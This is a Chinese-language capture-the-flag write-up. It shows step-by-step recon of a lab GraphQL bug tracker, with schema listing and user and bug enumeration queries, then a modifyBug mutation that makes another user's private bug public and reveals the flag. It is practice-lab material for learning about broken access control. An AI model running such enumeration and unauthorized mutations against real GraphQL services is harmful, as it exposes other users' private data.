
## 侦察与探测

访问首页
- 响应
    ```html
    <a href="graphql">
        GraphiQL
    </a>
    ```
端点 `/graphql`
- 响应
    - GQL JS 动态交互

- 格式
    ```log
    // 查询
    node(id: ID!): Node

    user(
        before: String
        after: String
        first: Int
        last: Int
    ): UsersConnection

    findUser(username: String): Users

    findBug(_: String): Bugs

    allUsers(
        before: String
        after: String
        first: Int
        last: Int
    ): UsersConnection

    allBugs: [Bugs]

    // 对象
    UsersConnection 
    pageInfo: PageInfo! edges: [UsersEdge]!
    {
        pageInfo: PageInfo
        edges: [UsersEdge]
    }

    PageInfo 
    hasNextPage: Boolean! hasPreviousPage: Boolean! startCursor: String endCursor: String
    {
        startCursor
        endCursor
    }

    UsersEdge 
    node: Users cursor: String!
    {
        node: Users
        cursor
    }

    Users 
    id: ID! username: String
    {
        id
        username
    }

    Bugs 
    id: ID! reporterId: Int text: String private: Boolean reporter: Users
    {
        id
        reporterId
        text
        reporter: Users
    }
    ```

- 查询漏洞
    ```graphql
    query myQueryBugs {
        allBugs {
            id
            reporterId
            text
            reporter {
                id
                username
            }
        }
    }
    ```
    - 无有趣内容
        ```json
        {
            "data": {
                "allBugs": [{
                    "id": "QnVnczox",
                    "reporterId": 1,
                    "text": "This is an example bug",
                    "reporter": {
                        "id": "VXNlcnM6MQ==",
                        "username": "admin"
                    }
                }]
            }
        }
        ```

- 查询用户
    ```graphql
    query myQueryUsers {
        allUsers {
            pageInfo{
                startCursor
                endCursor
            }
            edges{
                node{
                    id
                    username
                }
                cursor
            }
        }
    }
    ```
    - 响应
        ```json
        {
            "data": {
                "allUsers": {
                    "pageInfo": {
                        "startCursor": "YXJyYXljb25uZWN0aW9uOjA=",
                        "endCursor": "YXJyYXljb25uZWN0aW9uOjE="
                    },
                    "edges": [{
                        "node": {
                            "id": "VXNlcnM6MQ==",
                            "username": "admin"
                        },
                        "cursor": "YXJyYXljb25uZWN0aW9uOjA="
                    }, {
                        "node": {
                            "id": "VXNlcnM6Mg==",
                            "username": "victim"
                        },
                        "cursor": "YXJyYXljb25uZWN0aW9uOjE="
                    }]
                }
            }
        }
        ```
        - 此处的 victim 结合新增的变更字段，似乎在于修改模拟受害者的信息
        - 受害者无 bug 查询结果


- 变更结构
    ```log
    // 变更
    modifyBug(
        id: Int
        private: Boolean
        text: String
    ): modifyBug

    // 对象
    modifyBug
    ok: Boolean
    bug: Bugs
    {
        ok
        bug
    }
    ```
    - 变更修改 bug 的隐私变量

- 测试变更语句
    ```graphql
    mutation {
        modifyBug(
            id: 1
            private: true
        ){
            ok
            bug{
                id
                reporterId
                text
                private
                reporter{
                    id
                    username
                }
            }
        }
    }
    ```
    - 响应
        ```json
        {
            "data": {
                "modifyBug": {
                    "ok": true,
                    "bug": null
                }
            }
        }
        ```
        - bug 对象的字段查询失败很奇怪（之后设置隐私为 false，仍得到 null）
    - 提交后，再次查询 all bugs，得到空列表
    - all bugs 根据 bug 的隐私字段决定是否回显

- 提交变更载荷
    ```graphql
    mutation {
        modifyBug(
            id: 2 
            private: false
        ) {
            ok
        }
    }
    ```
    - 提交之前的 bug 查询
        ```json
        {
            "data": {
                "allBugs": [{
                        "id": "QnVnczox",
                        "reporterId": 1,
                        "text": "This is an example bug",
                        "reporter": {
                            "id": "VXNlcnM6MQ==",
                            "username": "admin"
                        }
                    },
                    {
                        "id": "QnVnczoy",
                        "reporterId": 2,
                        "text": "^FLAG^c1e6bf9571ba751854b30ea1ff4728677ff3f1f0077d63a85c7d454da69116da$FLAG$",
                        "reporter": {
                            "id": "VXNlcnM6Mg==",
                            "username": "victim"
                        }
                    }
                ]
            }
        }
        ```
        - 受害者的 bug 信息被修改为公开
